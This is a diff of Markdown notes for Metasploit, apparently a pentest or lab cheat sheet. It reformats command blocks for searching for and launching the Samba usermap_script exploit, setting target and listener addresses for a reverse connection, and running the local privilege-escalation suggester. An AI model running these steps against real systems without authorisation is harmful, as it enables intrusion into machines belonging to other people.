@@ -18,7 +18,9 @@ msfconsole -q
 ```bash
 # Return to previous page
 back
+```
 
+```bash
 # quit metasploit
 exit
 ```
@@ -28,19 +30,37 @@ exit
 ```bash
 # For example: samba
 search samba
+```
 
-# Choose by # or name
+```bash
+# Choose by #num
 use 15
+```
+
+```bash
+# Choose by full path
 use exploit/multi/samba/usermap_script
+```
 
+```bash
 # Show exploit settings
-optiions
+options
+```
 
+```bash
 # Set option, e.g.
 set rhosts 10.10.11.10
-set lhost 10.10.14.10
-set lport 1337
+```
 
+```bash
+set lhost 10.10.14.10
+```
+
+```bash
+set lport 1337
+```
+
+```bash
 # Run exploit
 run 
 ```
@@ -63,16 +83,24 @@ background
 # Quick look of potential privesc (Windows)
 # Need to return from meterpreter
 use post/multi/recon/local_exploit_suggester
+```
 
+```bash
 # Select opened session
 set session 1
+```
 
+```bash
 # Show exploit settings
 optiions
+```
 
+```bash
 # Set option, e.g.
 set rhosts 10.10.11.10
+```
 
+```bash
 # Run exploit
 run 
 ```
